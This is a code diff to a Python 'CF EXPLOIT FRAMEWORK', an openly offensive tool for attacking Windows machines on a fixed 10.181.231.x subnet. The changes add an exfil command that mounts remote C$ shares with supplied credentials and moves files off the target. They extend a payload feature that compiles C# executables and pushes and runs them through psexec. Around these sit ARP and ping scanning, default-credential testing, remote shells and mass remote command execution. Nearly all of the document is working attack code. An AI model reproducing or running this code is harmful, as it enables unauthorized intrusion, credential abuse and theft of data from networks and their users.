@@ -24,7 +24,8 @@ except ImportError as e:
     input()
     sys.exit(0)
 
-banner = r'''
+VERSION = "CF EXPLOIT FRAMEWORK v1"
+BANNER = r'''
   /$$$$$$  /$$$$$$$$ /$$$$$$$$
  /$$__  $$| $$_____/| $$_____/
 | $$  \__/| $$      | $$
@@ -34,23 +35,18 @@ banner = r'''
 |  $$$$$$/| $$$$$$$$| $$
  \______/ |________/|__/
                           '''
-
-validCommands = ["scan", "scannames", "hosts", "credtest", "getcmd", "rexec", "rcpy", "msg", "add", "remove", "intel",
-                 "source"]
-validDesc = [
-    "Run a ping scan to identify hosts on the network",
-    "Run a scan to find all the hosts on the network using netbios name", "List all hosts stored on this device",
-    "Test to see if default creds work", "Open a shell on a remote system (user / pass)",
-    "Run a command on a single or a group of PCs (add default to use 'Default' list)",
-    "rexec but copy and execute a file from this system", "Message a single or group of computers",
-    "Add an IP to a list", "Remove an IP from a list",
-    "View or edit intel on a given IP", "Edit the list of shared intel sources"
-]
-validUsage = ["-", "-", "hosts ([update])", "credtest [username:password] [list name to save under]",
-              "getcmd [ip] [username] [password]", "rexec [list name] [username:password] [command]",
-              "rcpy [list name] [username:password] [payload name]", "msg [list name] [num times] ", "add [ip] [list]",
-              "remove [ip] [list]", "intel [ip] ([add/remove] [information to add/remove])",
-              "source [add/del/list] ([ip])"]
+validCommands = {
+    "scan": ["Run a scan to identify hosts on the network", "scan [arp]"],
+    "hosts": ["View or edit host information", "hosts [{update} | {{add | remove} (ip)}]"],
+    "credtest": ["Test to see if default creds work", "credtest (username:password) (output_list)"],
+    "getcmd": ["Open a shell on a remote system", "getcmd (ip) (username:password)"],
+    "rexec": ["Run a command on a single or a group of PCs", "rexec (list_name) (username:password) (command)"],
+    "rcpy": ["rexec but copy and execute a file from this system", "rcpy (list_name) (username:password) (payload_name) [remote]"],
+    "msg": ["Message a single or group of computers", "msg (list_name) (count) (message...)"],
+    "intel": ["View or edit intel on a given IP", "intel (ip) [{add | remove} [intel_to_add]"],
+    "source": ["View or edit the list of shared intel sources", "source {{add | del} (ip) | list}"],
+    "exfil": ["Exfiltrate data from a remote host", "exfil (target) (username:password)"]
+}
 
 ipNames = []
 customLists = []
@@ -62,9 +58,8 @@ intelSources = []
 
 regex_ipv4 = r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
 
-root_path = r"C:\Users\Admin"
-psexec_path = root_path + r"\pstools\psexec.exe"
-nbtscan_path = root_path + r"\nbtscan.exe"
+root_path = os.getcwd()
+psexec_path = root_path + r"\tools\psexec.exe"
 cs_path = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
 
 # CRYPTO INIT
@@ -286,7 +281,7 @@ class client(Thread):
 
 # =============================================================================
 # =============================================================================
-# === CLIENT SIDE - MAKE INFORMATION REQUESTS TO OTHER DEVICES RUNNING CFEF ===
+# === CLIENT SIDE - MAKE INFORMATION REQUESTS TO OTHER DEVICES RUNNING CEF ===
 # =============================================================================
 # =============================================================================
 
@@ -357,28 +352,22 @@ def menu():
     global customLists
     global ipNames
     os.system("cls")
-    for line in banner:
+    for line in BANNER:
         print(line, end="")
-    print("\n[!] Type 'help' to see available commands, and 'usage' for syntax")
+    print("\n" + VERSION)
+    print("\n[!] Type 'help' to see available commands")
 
     while True:
         cmd = input("\n> ").split(" ")
         if cmd[0] == "help":
-            print("\n[!] Available commands are:\n")
-            for i in range(0, len(validCommands)):
-                print("[+] " + validCommands[i] + " :: " + validDesc[i])
-            print("\n[!] Type 'usage' for info on how to run the commands\n")
-            beep()
-
-        if cmd[0] == "usage":
-            print("\n[!] Usage is as follows:\n")
-            for i in range(0, len(validCommands)):
-                print("[+] " + validCommands[i] + " :: " + validUsage[i])
-            print("")
+            print("\n[!] Available commands are")
+            for command in validCommands:
+                print("|\n|__[+] %s\n| |\n| |__%s\n|    |__%s" % (command, validCommands[command][0], validCommands[command][1]))
             beep()
 
         if cmd[0] == "getcmd":
-            rconnect(cmd[1], cmd[2], cmd[3])
+            creds = cmd[2].split(":")
+            rconnect(cmd[1], creds[0], creds[1])
 
         if cmd[0] == "msg":
             targList = customLists[ipNames.index(cmd[1])]
@@ -390,9 +379,9 @@ def menu():
 
         if cmd[0] == "clear":
             os.system("cls")
-            for line in banner:
+            for line in BANNER:
                 print(line, end="")
-            print("\nCF EXPLOIT FRAMEWORK v0.2")
+            print("\n" + VERSION)
             beep()
 
         if cmd[0] == "rexec":
@@ -403,18 +392,21 @@ def menu():
                 rexec(targList, command, creds)
 
         if cmd[0] == "rcpy":
-            if len(cmd) == 4:
+            if len(cmd) >= 4:
                 targList = customLists[ipNames.index(cmd[1])]
                 creds = cmd[2]
                 payload = cmd[3]
-                rcpy(targList, payload, creds)
+                if len(cmd) >= 5 and cmd[4] == "remote":
+                    rcpy(targList, payload, creds, True)
+                else:
+                    rcpy(targList, payload, creds)
 
         if cmd[0] == "scan":
-            rscan()
-            beep()
-
-        if cmd[0] == "scannames":
-            rscannames()
+            if len(cmd) == 2:
+                if cmd[1] == "arp":
+                    rscanarp()
+            else:
+                rscan()
             beep()
 
         if cmd[0] == "hosts":
@@ -423,7 +415,6 @@ def menu():
                     del customLists[x]
                     del ipNames[x]
                     intelWrite(suppressMsg=True)
-
             if len(cmd) == 1:
                 if len(customLists) > 0:
                     print("\n[!] Showing host information")
@@ -432,8 +423,30 @@ def menu():
                         print("|\n|__[+] %s\n|  |\n|  |__%s" % (ipNames[i], str(customLists[i])))
                 else:
                     print("\n[!] No hosts found, scan or run 'hosts update' to pull off the network")
-            if len(cmd) == 2 and cmd[1] == "update":
-                updateHosts()
+            if len(cmd) == 2:
+                if cmd[1] == "update":
+                    updateHosts()
+            if len(cmd) == 4:
+                if cmd[1] == "remove":
+                    if len(cmd) == 4:
+                        if cmd[3] in ipNames:
+                            targList = customLists[ipNames.index(cmd[3])]
+                            if int(cmd[2]) in targList:
+                                customLists[ipNames.index(cmd[3])].remove(int(cmd[2]))
+                        intelWrite()
+                        beep()
+
+                if cmd[1] == "add":
+                    if len(cmd) == 4:
+                        if cmd[3] in ipNames:
+                            targlist = customLists[ipNames.index(cmd[3])]
+                            if cmd[3] not in targlist:
+                                targlist.append(int(cmd[2]))
+                        else:
+                            customLists.append([int(cmd[2])])
+                            ipNames.append(cmd[3])
+                        intelWrite()
+                        beep()
             beep()
 
         if cmd[0] == "credtest":
@@ -441,27 +454,6 @@ def menu():
                 credTest(cmd[1], cmd[2])
             except Exception:
                 pass
-
-        if cmd[0] == "remove":
-            if len(cmd) == 3:
-                if cmd[2] in ipNames:
-                    targList = customLists[ipNames.index(cmd[2])]
-                    if int(cmd[1]) in targList:
-                        customLists[ipNames.index(cmd[2])].remove(int(cmd[1]))
-                intelWrite()
-                beep()
-
-        if cmd[0] == "add":
-            if len(cmd) == 3:
-                if cmd[2] in ipNames:
-                    targlist = customLists[ipNames.index(cmd[2])]
-                    if cmd[2] not in targlist:
-                        targlist.append(int(cmd[1]))
-                else:
-                    customLists.append([int(cmd[1])])
-                    ipNames.append(cmd[2])
-                intelWrite()
-                beep()
 
         if cmd[0] == "intel":
             if len(cmd) == 2:
@@ -500,6 +492,12 @@ def menu():
                     for line in file:
                         print("|\n|__[+] %s" % line.replace("\n", ""))
                         beep()
+        if cmd[0] == "exfil":
+            if len(cmd) == 3:
+                creds = cmd[2].split(":")
+                exfil(cmd[1], "C$\\ProgramData\\Microsoft\\Windows",creds[0], creds[1])
+            else:
+                print("Incorrect usage: see \"help\" command")
 
 
 def getintel(host):
@@ -556,10 +554,10 @@ def credTest(creds="Profile:password", iplist="default"):
     print("[+] " + str(customLists[listIndex]).replace(" ", ""))
     loginString = "LOGIN: " + username + ":" + password
     for item in customLists[listIndex]:
-        updateIntel(item, loginString, online=False, suppress=True)
+        updateIntel("10.181.231." + str(item), loginString, action="add", online=False, suppress=True)
     for item in customLists[0]:
         if item not in customLists[listIndex]:
-            updateIntel(item, loginString, action="remove", online=False, suppress=True)
+            updateIntel("10.181.231." + str(item), loginString, action="remove", online=False, suppress=True)
     if len(customLists[listIndex]) == 0:
         del customLists[listIndex]
         del ipNames[listIndex]
@@ -601,48 +599,104 @@ def rexecT(tgt=0, uname="", pword="", cmd="", index=0, sav=False,
     completeFlags[index] = 1
 
 
-def rcpy(targetList, payload, creds):
+def rcpy(targetList, payload, creds, args="", remote=False):
     global completeFlags
     global customLists
     completeFlags = []
     uname = creds.split(":")[0]
     password = creds.split(":")[1]
     index = 0
+    if payload.endswith(".cs"):
+        payload_cmd = ""
+        if remote:
+            payload_cmd = cs_path + " -target:winexe -out:" + os.getcwd() + "\\payloads\\pl.exe " + os.getcwd() + "\\payloads\\" + payload
+        else:
+            payload_cmd = cs_path + " -out:" + os.getcwd() + "\\payloads\\pl.exe " + os.getcwd() + "\\payloads\\" + payload
+        payload = "payloads\\pl.exe"
+        print(payload_cmd)
+        os.system(payload_cmd + " " + args)
     for i in targetList:
         completeFlags.append(0)
-        x = threading.Thread(target=rcpyT, args=(i, uname, password, payload, index))
+        x = threading.Thread(target=rcpyT, args=(remote, i, uname, password, payload, index))
         x.start()
         time.sleep(.1)
         index += 1
     while 0 in completeFlags:
         pass
     print("\n[+] Done")
+    os.remove("payloads/pl.exe")
 
 
-# DEAD METHOD - TO BE FIXED
-def rcpyT(tgt=0, uname="", pword="", payload="",
-          index=0):  # The actual function for executing a command so that it can be threaded
+def rcpyT(remote, tgt=0, uname="", pword="", payload="", index=0):  # The actual function for executing a command so that it can be threaded
     global completeFlags
     ending = tgt
     tgt = "10.181.231." + str(tgt)
     psexecString = ""
-    psexecString = psexec_path + r' -nobanner \\%s -u %s -p %s -c %s"' % (tgt, uname, pword, payload)
+    if remote:
+        psexecString = psexec_path + r' -nobanner \\%s -i -u %s -p %s -c %s"' % (tgt, uname, pword, payload)
+    else:
+        psexecString = psexec_path + r' -nobanner \\%s -u %s -p %s -c %s"' % (tgt, uname, pword, payload)
     resp = os.system(psexecString)
+    print(resp)
     completeFlags[index] = 1
 
 
 def rscan():  # Conducts a ping scan to discover any hosts on the network
     global customLists
-    if len(customLists) == 0:
-        customLists.append([])
-    if len(ipNames) == 0:
-        ipNames.append("ips")
+    if len(customLists) > 0:
+        if ipNames[0] == "ips":
+            customLists[0] = []
+        else:
+            for x in range(0, len(ipNames)):
+                if ipNames[x] == "ips":
+                    del ipNames[x]
+                    del customLists[x]
+
+            ipNames.insert(0, "ips")
+            customLists.insert(0, [])
     else:
-        customLists[0] = []
+        ipNames.append("ips")
+        customLists.append([])
     for i in range(100, 240):
         ip = "10.181.231." + str(i)
-        if os.system("ping -n 1 -w 100 " + ip) == 0:
+        if os.system("ping -n 1 -w 10 " + ip) == 0:
             customLists[0].append(i)
+    scanComplete()
+
+
+def rscanarp():  # Conducts an arp scan to discover any hosts on the network
+    global customLists
+    listIndex = 0
+    if len(customLists) > 0:
+        if ipNames[0] == "ips":
+            customLists[0] = []
+        else:
+            for x in range(0, len(ipNames)):
+                if ipNames[x] == "ips":
+                    del ipNames[x]
+                    del customLists[x]
+
+            ipNames.insert(0, "ips")
+            customLists.insert(0, [])
+    else:
+        ipNames.append("ips")
+        customLists.append([])
+
+    os.system("arp -a -n " + socket.gethostbyname(socket.gethostname()) + " > arp.txt")
+    with open("arp.txt", "r") as file:
+        for line in file:
+            try:
+                temp = line.split(" ")
+                temp2 = temp[2].split(".")
+                if "static" not in temp:
+                    customLists[0].append(temp2[3])
+            except IndexError:
+                pass
+    os.remove("arp.txt")
+    scanComplete()
+
+
+def scanComplete():
     os.system("cls")
     print("\n==================================================")
     print("\n[+] HOST SCAN COMPLETE")
@@ -650,19 +704,6 @@ def rscan():  # Conducts a ping scan to discover any hosts on the network
     print("\n[+] RANGE: " + str(customLists[0][0]) + " -> " + str(customLists[0][-1]))
     print("\n==================================================\n")
     intelWrite()
-
-
-def rscannames():  # Conducts a scan of the netbios names to discover any hosts on the network
-    global customLists
-    customLists[0] = []
-    for name in range(63):
-        customLists[0].append(os.system(nbtscan_path + " \"" + str(name) + "\""))
-    os.system("cls")
-    print("\n==================================================")
-    print("\n[+] NAME SCAN COMPLETE")
-    print("\n[+] DISCOVERED: " + str(len(customLists[0])))
-    print("\n[+] RANGE: " + str(customLists[0][0]) + " -> " + str(customLists[0][-1]))
-    print("\n==================================================\n")
 
 
 def rmsg(targets, reason, num):
@@ -679,6 +720,20 @@ def rmsgT(reason="", target=""):
     os.system(r'msg Admin /SERVER %s %s' % (target, reason))
 
 
+def exfil(target, path, usr, passwd):
+    targetpath = "\\\\10.181.231." + target + "\\" + path
+    print(targetpath)
+    if not os.path.exists("\\exfil"):
+        os.system("mkdir exfil")
+    os.system(r'net use m: ' + targetpath + ' /user:' + usr + " " + passwd)
+    try:
+        os.system("move " + '"M:\Start Menu\Programs\StartUp\*.txt" ' + os.getcwd() + "\\exfil\\")
+    except Exception as ex:
+        print("Unable to copy file. %s" % ex)
+    finally:
+        os.system('net use m: /del /Y')
+
+
 def getDependencies():
     if not os.path.exists(psexec_path):  # Get PSExec if you don't have it in path
         print("Do you want to install PSExec? (Required dependency) [Y/n]")
@@ -692,19 +747,10 @@ def getDependencies():
                 with zipfile.ZipFile(r"pstools.zip", 'r') as zip_ref:
                     zip_ref.extractall(root_path + r"\pstools")
                 os.remove("pstools.zip")
+                os.system("cd " + root_path + r"\pstools & " + 'for %i in (*) do if not "%~i" == "PsExec.exe" del "%~i"')
+                os.system("rename pstools tools")
             else:
                 print("Failed to get PSExec dependency")
-    if not os.path.exists(nbtscan_path):
-        print("Do you want to install PSExec? (Required dependency) [Y/n]")
-        if not input() == "n":
-            response = requests.get(r"http://www.unixwiz.net/tools/nbtscan-1.0.35.exe")
-            if response.ok:
-                print("Getting nbtscan dependency...")
-                file = open(nbtscan_path, "wb+")  # write, binary, allow creation
-                file.write(response.content)
-                file.close()
-            else:
-                print("Failed to get nbtscan dependency")
     if not os.path.exists(cs_path):
         print("Do you want to install C# Compiler? (For payloads) [Y/n]")
         if not input() == "n":
@@ -717,10 +763,13 @@ def getDependencies():
                 print("Failed to get csc dependency")
 
 
-x = threading.Thread(target=serverT)
-x.start()
-getDependencies()
-intelInit()
+if __name__ == "__main__":
+    x = threading.Thread(target=serverT)
+    x.start()
+    getDependencies()
+    intelInit()
+    time.sleep(1)
+    menu()
 
 gui_cli=input("Do you want to use the GUI Y/N")
 if gui_cli=="N":
